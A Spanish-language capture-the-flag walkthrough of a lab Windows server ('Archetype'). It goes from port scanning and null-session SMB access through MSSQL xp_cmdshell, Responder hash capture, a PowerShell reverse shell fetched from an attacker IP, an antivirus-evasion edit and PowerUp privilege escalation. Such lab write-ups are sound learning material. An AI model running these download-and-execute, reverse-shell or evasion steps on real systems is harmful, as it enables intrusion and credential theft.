# Archetype



### Sistema Operativo

A través del lanzamiento de un ping podemos saber que nos enfrentamos a una máquina Windows.

```
Comando >    ping -c 1 10.10.10.27
Output    >    PING 10.10.10.27 (10.10.10.27) 56(84) bytes of data.
        64 bytes from 10.10.10.27: icmp_seq=1 ttl=127 time=39.5 ms

        --- 10.10.10.27 ping statistics ---
        1 packets transmitted, 1 received, 0% packet loss, time 0ms
        rtt min/avg/max/mdev = 39.500/39.500/39.500/0.000 ms
```

A través del ttl sabemos que es Windows, ya que 127 corresponde a una máquina de tipo Windows.

### Escaneo de puertos

Vamos a realizar un escaneo de puertos que nos permita identificar posibles vías de explotación:

```
Comando    >    nmap -p- -min-rate 5000 --open 10.10.10.27
```

Al ser un entorno controlado estamos realizando un escaneo rápido, si tuviésemos que evitar cierta seguridad o ser más silenciosos usaríamos otro método.

```
Puertos    >    135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669
```

Busquemos algo de información:

```
Comando    >    nmap -sC -sV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669 -n -Pn 10.10.10.27

Output    >    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
        Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-30 10:20 CEST
        Nmap scan report for 10.10.10.27
        Host is up (0.10s latency).

        PORT      STATE SERVICE      VERSION
        135/tcp   open  msrpc        Microsoft Windows RPC
        139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
        445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
        1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
        | ms-sql-ntlm-info: 
        |   Target_Name: ARCHETYPE
        |   NetBIOS_Domain_Name: ARCHETYPE
        |   NetBIOS_Computer_Name: ARCHETYPE
        |   DNS_Domain_Name: Archetype
        |   DNS_Computer_Name: Archetype
        |_  Product_Version: 10.0.17763
        | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
        | Not valid before: 2021-04-30T08:01:41
        |_Not valid after:  2051-04-30T08:01:41
        |_ssl-date: 2021-04-30T08:40:04+00:00; +18m02s from scanner time.
        5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-server-header: Microsoft-HTTPAPI/2.0
        |_http-title: Not Found
        47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
        |_http-server-header: Microsoft-HTTPAPI/2.0
        |_http-title: Not Found
        49664/tcp open  msrpc        Microsoft Windows RPC
        49665/tcp open  msrpc        Microsoft Windows RPC
        49666/tcp open  msrpc        Microsoft Windows RPC
        49667/tcp open  msrpc        Microsoft Windows RPC
        49668/tcp open  msrpc        Microsoft Windows RPC
        49669/tcp open  msrpc        Microsoft Windows RPC
        Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

        Host script results:
        |_clock-skew: mean: 1h42m02s, deviation: 3h07m50s, median: 18m01s
        | ms-sql-info: 
        |   10.10.10.27:1433: 
        |     Version: 
        |       name: Microsoft SQL Server 2017 RTM
        |       number: 14.00.1000.00
        |       Product: Microsoft SQL Server 2017
        |       Service pack level: RTM
        |       Post-SP patches applied: false
        |_    TCP port: 1433
        | smb-os-discovery: 
        |   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
        |   Computer name: Archetype
        |   NetBIOS computer name: ARCHETYPE\x00
        |   Workgroup: WORKGROUP\x00
        |_  System time: 2021-04-30T01:39:54-07:00
        | smb-security-mode: 
        |   account_used: guest
        |   authentication_level: user
        |   challenge_response: supported
        |_  message_signing: disabled (dangerous, but default)
        | smb2-security-mode: 
        |   2.02: 
        |_    Message signing enabled but not required
        | smb2-time: 
        |   date: 2021-04-30T08:39:56
        |_  start_date: N/A

        Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
        Nmap done: 1 IP address (1 host up) scanned in 67.71 seconds
```

### PUERTO 135 MSRPC

Es la llamada a procedimiento remoto de Microsoft. Es un protocolo que se utiliza para que un programa pueda solicitar el servicio de un programa en otro ordenador sin tener que comprender los detalles de ese ordenador. Dependiendo de la configuración del host puede llegar a accederse a este a través de SMB con una sesión nula o autenticada (139, 445)

```
Comando    >    /usr/share/doc/python3-impacket/examples/rpcdump.py -p 135 10.10.10.27 > rpcdump.txt
```

Y de aquí haciendo un grep rápido

```
Comando    >    cat rpcdump.txt | egrep "3919286|12345778|1ff706|1FF706|338CD|338cd|367abb|367ABB|4b324|4B324|4D9F|4d9f"
```

Sacamos la siguiente información:

```
UUID    : 1FF70682-0A51-30E8-076D-740BE8CEE98B v1.0 -> Programador de tareas, utilizado para ejecutar comandos de forma segura
                            En principio teniendo acceso a un usuario y contraseña o a un HASH NTLM podríamos aprovecharnos para ejecutar
                            comandos de forma remota con la herramienta "atexec.py" de Impacket

UUID    : 12345778-1234-ABCD-EF00-0123456789AC v1.0 -> Interfaz LSA SAMR, utilizado para los elementos de base de datos SAM de acceso público.
                            Con el uso de la heraramienta "samrdump.py" de Impacket podríamos conseguir enumerar información del propio sistema
                            Usuarios, grupos, SID, dominios...

UUID    : 367ABB81-9844-35F1-AD32-98F038001003 v2.0 -> Servicios de servidor y administrador de control de servicios, que se utilizan para iniciar y detener servicios además
                            de ejecutar comandos de forma remota.
                            A través de las herramientas "psexec/smbexec" de Impacket podríamos ejecutar comandos en la máquina objetivo.
                            Para realizar esto necesitaríamos usuario y contraseña, un HASH NTLM, o podríamos a través de una autenticación mediante
                            Kerberos.

        ----------------------------------------------------------------------------------------------
        psexec    ->    Copia un binario a la carpeta ADMIN$ a través de SMB, crea un servicio en la máquina
                objetivo hacia el binario y ejecuta el servicio de forma externa. Cuando sale para el
                servicio y borra el binario.

        smbexec    ->    Funciona similar a psexec pero en vez de apuntar a un archivo malicioso lo hace a un
                CMD o Powershell
        ----------------------------------------------------------------------------------------------
```

### PUERTO 139 NetBIOS

Son las siglas de Network Basic Input Output System. Es decir, es un protocolo de software que permite que las apps, PC y equipos de una LAN se comuniquen con la red y transmitan datos a través de ella. Las aplicaciones que se ejecuten en una red NETBIOS se identifican a través de un nombre NetBIOS de hasta 16 caracteres.

Es un agujero de seguridad ya que a través de la herramienta "nbtscan" se puede obtener información de la máquina objetivo.

Aunque con la búsqueda completa que hacemos de scripts con nmap ya obtendríamos la información que queremos podríamos hacer una búsqueda concreta únicamente de este punto:

```
Comando >    sudo nmap --script nbstat.nse -p139 10.10.10.27
Comando    >    sudo nbtscan -r 10.10.10.27/24
```

### PUERTO 445 SAMBA

SMB son las siglas de 'Server Message Blocks'. Es un protocolo de red que se usa para ofrecer acceso compartido a archivos, impresoras, puertos y otros tipos de comunicaciones entre nodos de una red. De hecho en Windows puede ejecutarse sin necesidad de NetBIOS usando el puerto 445.

A través de un Null Session podríamos llegar a interactuar con los servicios expuestos. Podemos hacerlo a través de la herramienta enum4linux

```
Comando    >    enum4linux 10.10.10.27
```

En este caso tenemos muchos accesos denegados y no hemos sacado información de valor con el uso de esta herramienta.

Probamos a buscar algun exploit a través de la herramienta "searchsploit"

```
Comando    >    searchsploit smb 2019
```

Y no encontramos ningún exploit, por lo que procedemos a probar distintas credenciales, tanto NULL SESSION cómo otras posibilidades.

```
User            Pass
------            ------
NULL            NULL
guest            NULL
Administrator, admin    NULL,password, administrator, admin
arcserver        arcserve,backup
tivoli,tmersrvd        tivoli,tmersrvd,admin
backupexec,backup    backupexec,backup,arcada
test,lab,demo        password,test,lab,demo
```

Con una NULL SESSION hemos conseguido directamente acceder al listado de los recursos compartidos

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
backups         Disk      
C$              Disk      Default share
IPC$            IPC       Remote IPC
```

Y con el siguiente comando vamos a intentar listar cada uno de los recursos para saber en cuales tenemos acceso

```
Comando    >    smbclient -N -L 10.10.10.27 | egrep "Disk|IPC" | sed 's/\s*\(.*\)\s*Disk.*/\1/' | sed 's/\s*\(.*\)\s*IPC\s.*/\1/' | while read shared; do echo "[*]${shared}[*]"; smbclient -N "//10.10.10.27/${shared}" -c dir; echo; done
```

Resulta que únicamente tenemos acceso a la carpeta backups donde hay un archivo llamado prod.dtsconfig, entramos y lo descargamos

```
Comando    >    smbclient -N //10.10.10.27/backups -c "get prod.dtsconfig"
```

Resulta que dentro de dicho archivo tenemos las siguientes credenciales:

```
User            Pass
------            ------
ARCHETYPE\sql_svc    M3g4c0rp123
```

Y ese inicio del usuario "sql" nos parece indicar que pueden ser unas credenciales quizás válidas para un servidor SQL ya que siguen sin darnos acceso a más archivos a través de SMB

### PUERTO 1433 SQL SERVER

Parece ser que hay un puerto con un servidor SQL, del cual sabemos que es un Microsoft SQL Server 2017 además de:

```
    | ms-sql-ntlm-info:
            |   Target_Name: ARCHETYPE
            |   NetBIOS_Domain_Name: ARCHETYPE
            |   NetBIOS_Computer_Name: ARCHETYPE
            |   DNS_Domain_Name: Archetype
            |   DNS_Computer_Name: Archetype
            |_  Product_Version: 10.0.17763
```

Tampoco parece haber exploits conocidos

```
Comando    >    searchsploit "microsoft sql server"
```

Pero cómo tenemos unas credenciales de acceso vamos a probar a entrar directamente con la herramienta "mssqlclient" de Impacket

```
Comando    >    impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27 -windows-auth
```

Una vez dentro podemos habilitar la posibilidad de utilizar la consola de comandos de la siguiente forma:

```
Comando    >    sp_configure 'show advanced option', '1'
        RECONFIGURE
        sp_configure 'xp_cmdshell', '1'
        RECONFIGURE
```

Cómo prueba de concepto vamos a hacer lo siguiente, en este caso sabemos perfectamente cual es la contraseña, pero pongamos que podemos tener acceso anónimo o de otra manera al servidor SQL, podríamos aprovecharnos para obtener un HASH NetNTLM si hiciesemos el siguiente comando dentro del propio servidor SQL:

```
Comando    >    sudo python Responder.py -I tun0 -rdw            #Nos ponemos a la escucha con el Responder envenenando la red
        exec master.dbo.xp_dirtree '\\10.10.16.23\any\thing'    #Ejecutamos la petición
```

De esta manera obtenemos el siguiente HASH en "/usr/share/responder/log/NTLM

```
sql_svc::ARCHETYPE:6092fae68960ec87:6BC1DC00C82EA1DC217D8D199F190615:01010000000000000076D9B6EC3DD701DCBB5201C9A71E070000000002000800500035003500570001001E00570049004E002D00580045005700500052005A003200330059003100570004003400570049004E002D00580045005700500052005A00320033005900310057002E0050003500350057002E004C004F00430041004C000300140050003500350057002E004C004F00430041004C000500140050003500350057002E004C004F00430041004C00070008000076D9B6EC3DD701060004000200000008003000300000000000000000000000003000000AC7DAFE8E241D888F06CFB576E1658115FF26999B6BACE9AAC6E0C7B67EDB490A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E0032003300000000000000000000000000
```

Podríamos intentar crackearlo, por ejemplo con herramientas online como onlinehashcrack.com o directamente en nuestra consola con algún diccionario y john the ripper u otra utilidad vamos a hacer la prueba de concepto creando un diccionario en el que esté la contraseña que conocemos y una serie de palabras al azar.

```
Comando    >    john -wordlist=diccionario.txt hash
```

Y efectivamente hemos conseguido que nos descubra la contraseña, en este caso ya la teníamos pero es una prueba de concepto interesante para otras máquinas.

Ahora vamos a lo útil, ya tenemos acceso a una consola de comandos por lo que ya podríamos considerar establecernos una Reverse Shell y empezar a conseguir más información dentro de la máquina, o incluso desde fuera podríamos hacerlo.

Si nosotros hacemos un:

```
Comando    >    Locate Invoke-PowerShell
```

Tenemos las Reverse Shell de Nishang para este cometido, podríamos utilizar la "Invoke-PowerShellTcpOneLine.ps1" Cambiando por supuesto el puerto y la IP desde la que escuchamos. Para establecer la reverse shell simplemente debemos llamarla desde la consola de comandos a la que tenemos acceso ahora mismo:

```
Comando    >    python3 -m http.server 80    #Para poner un servidor donde está alojada la reverse shell
        nc -nlvp 443            #Para ponernos a la escucha y acceder a nuestra reverse shell
        xp_cmdshell "powershell "IEX (New-Object Net.Webclient).DownloadString(\"http://10.10.17.190/rat.ps1\");"
```

El problema que nos da el siguiente error

```
    This script contains malicious content and has been blocked by your antivirus software
```

Parece que nos ha cascado el antivirus, de todas manera que no cunda el pánico ya que podemos sin ningún problema solucionarlo, generalmente hay una pequeña parte de la ReverseShell que es captada por el antivirus.

```
$sendback2  = $sendback + "PS " + (pwd).Path + "> "
```

Por lo que vamos a cambiarlo por

```
$cosa = (Get-Location);$sendback2  = $sendback + $cosa + "# " 
```

De esta manera tenemos la misma funcionalidad pero en principio no nos lo captaría el antivirus, también podríamos ofuscarlo si no funcionase con herramienta como "invoke-obfuscation" Y ya conseguimos estar dentro.

### HASH NetNTLM-v2

Otra de las opciones que tenemos sabiendo que nos enfrentamos a una máquina Windows que podría estar dentro de un AD sería intentar intercepta algún HASH para posteriormente crackear contraseñas con baja seguridad. Para hacer esto usamos la herramienta "Responder.py" cd /usr/share/responder que nos mantiene a la escucha.

```
Comando    >    sudo python Responder.py -I tun0 -rdw
```

Aunque parece que no encontramos nada interesante, tras esperar un rato no ha habido suerte en interceptar ningún HASH.

### ESCALADA DE PRIVILEGIOS

En primer lugar enumeremos el sistema

```
Comando    >    systeminfo
Output    >    OS Name:                   Microsoft Windows Server 2019 Standard
        OS Version:                10.0.17763 N/A Build 17763
```

No parece haber exploits conocidos para esta versión.

Si buscamos en el historial de PowerShell

```
Comando    >    powershell type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Output    >    net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
```

parece que hemos encontrado el usuario y contraseña del admin, de todas maneras veamos si hay más vías de entrada. Vamos a intentar a través del script PowerUp encontrar alguna vía para escalar privilegios.

En primer lugar vamos a intentarlo desde nuestra reverse shell

```
Comando    >    powershell IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.16.30/pu.ps1\")
```

Pero resulta que no nos da ningún output pero quizás si que conseguimos el output del script si ejecutamos a través de la shell de sql donde efectivamente recibimos lo siguiente:

```
[*] Running Invoke-AllChecks                                                       

[*] Checking if user is in a local group with administrative privileges...         

[*] Checking for unquoted service paths...                                         

[*] Checking service executable and argument permissions...                        

[*] Checking service permissions...                                                

ServiceName   : UsoSvc                                                             

Path          : C:\Windows\system32\svchost.exe -k netsvcs -p                      

StartName     : LocalSystem                                                        

AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'                                 

CanRestart    : True                                                               

[*] Checking %PATH% for potentially hijackable DLL locations...                    

ModifiablePath    : C:\Users\sql_svc\AppData\Local\Microsoft\WindowsApps           

IdentityReference : ARCHETYPE\sql_svc                                              

Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}          

%PATH%            : C:\Users\sql_svc\AppData\Local\Microsoft\WindowsApps           

AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\sql_svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'   

[*] Checking for AlwaysInstallElevated registry key...                             

[*] Checking for Autologon credentials in registry...                              

[*] Checking for modifidable registry autoruns and configs...                      

[*] Checking for modifiable schtask files/configs...                               

[*] Checking for unattended install files...                                       

[*] Checking for encrypted web.config strings...                                   

[*] Checking for encrypted application pool and virtual directory passwords...     

[*] Checking for plaintext passwords in McAfee SiteList.xml files....              

[*] Checking for cached Group Policy Preferences .xml files....                    
```

En principio ha encontrado dos vías de entrada para escalar privilegios, un servicio con suficientes permisos para poder ejecutar la creación de un nuevo usuario con permisos de admin o la posibilidad de explotar un DLL Hijacking. Lo bueno es que directamente con el mismo Script de PowerUp podríamos aprovecharnos de cualquiera de esas dos vulnerabilidades y una vez siendo admin de la máquina intentar descargar otras contraseñas y conseguirlas por fuerza bruta por ejemplo.

También hemos sido capaces de poder utilizarlo descargando el archivo en la máquina objetivo y ejecutarlo directamente desde allí.

```
Comando    >    powershell (New-Object Net.WebClient).DownloadFile("\http://10.10.16.30/pu.ps1\", \"C:\Windows\temp\rat\pu.ps1\")
```



> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
